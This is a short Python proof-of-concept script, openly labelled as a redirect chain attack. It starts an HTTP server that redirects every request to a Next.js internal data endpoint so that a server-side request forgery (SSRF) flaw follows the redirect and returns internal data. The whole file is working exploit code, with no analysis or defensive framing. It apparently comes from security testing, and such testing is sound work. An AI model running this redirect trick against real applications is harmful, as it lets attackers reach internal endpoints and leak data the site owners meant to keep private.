#!/usr/bin/env python3
"""
Redirect Chain Attack PoC
==========================

Can we make the SSRF follow a redirect to /_next/data 
and then return it as an "image"?

The internal service redirects to the Next.js data endpoint.
"""

from http.server import HTTPServer, BaseHTTPRequestHandler

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Redirect to Next.js internal data endpoint
        target = "http://127.0.0.1:3000/_next/data/development/index.json"
        
        print(f"\n[REDIRECT] Redirecting to: {target}")
        
        self.send_response(302)
        self.send_header('Location', target)
        self.end_headers()
    
    def log_message(self, format, *args):
        pass

if __name__ == "__main__":
    port = 9990
    print("=" * 60)
    print(" Redirect Chain Attack PoC")
    print("=" * 60)
    print(f"\nListening on 127.0.0.1:{port}")
    print(f"\nWill redirect to: http://127.0.0.1:3000/_next/data/...")
    print("=" * 60)
    
    HTTPServer(('127.0.0.1', port), RedirectHandler).serve_forever()
